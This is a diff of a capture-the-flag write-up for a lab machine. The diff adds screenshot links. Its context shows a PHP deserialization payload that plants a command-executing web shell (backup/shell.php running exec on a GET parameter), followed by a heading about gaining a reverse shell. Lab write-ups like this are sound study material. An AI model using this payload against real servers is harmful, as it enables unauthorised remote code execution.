@@ -177,6 +177,8 @@ http://10.10.41.176/backup/
 
 It contains some backups files of server.
 
+![Debug_backup.png](https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/debug/Debug_backup.png)
+
 
 http://10.10.41.176/index.php
 
@@ -185,6 +187,10 @@ Has some message sending functionality.
 http://10.10.41.176/message.txt
 
 Displays the message sent.
+
+
+![Debug_message.png](https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/debug/Debug_message.png)
+
 
 Important php code of index.php from the backup.
 ```php
@@ -245,6 +251,19 @@ print $serial;
 
 Payload : `O:10:"FormSubmit":2:{s:9:"form_file";s:16:"backup/shell.php";s:7:"message";s:30:"<?php%20echo%20exec($_GET[cmd])%20?>";}`
 
+
+Sending it with burp
+
+![Debug_burp.png](https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/debug/Debug_burp.png)
+
+
+Gives the following web shell
+
+
+![Debug_webshell.png](https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/debug/Debug_webshell.png)
+
+
+Gaining reverse shell
 
 ## USER [www-data]
 ```bash
